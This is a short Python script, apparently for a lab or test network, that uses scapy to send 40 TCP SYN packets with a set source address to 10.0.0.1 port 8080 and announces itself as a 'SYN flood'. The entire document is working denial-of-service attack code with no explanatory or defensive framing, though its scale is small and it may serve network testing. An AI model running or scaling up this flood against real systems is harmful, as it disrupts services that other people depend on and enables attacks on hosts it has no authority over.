from scapy.all import IP, TCP, send
import time

target_ip = "10.0.0.1"
target_port = 8080

print(f"[*] Starting SYN flood on {target_ip}:{target_port}")

for i in range(40):
    pkt = IP(src="10.0.0.3", dst=target_ip) / TCP(sport=10000+i, dport=target_port, flags="S")
    send(pkt, verbose=0)
    print(f"Sent SYN packet {i+1}")
    time.sleep(0.05) 

print("[*] Flood complete.")
